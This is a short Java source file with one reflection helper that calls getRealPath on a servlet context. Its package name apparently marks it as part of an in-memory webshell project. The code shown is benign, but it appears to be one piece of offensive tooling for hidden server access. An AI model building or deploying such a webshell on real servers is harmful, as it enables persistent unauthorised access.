package net.rebeyond.memshell.redefine;

public class MyServletContext {
	public static String getRealPath(Object servletContext ,String arg) throws Exception
	{
		return servletContext.getClass().getMethod("getRealPath", String.class).invoke(servletContext, arg).toString();
	}
}
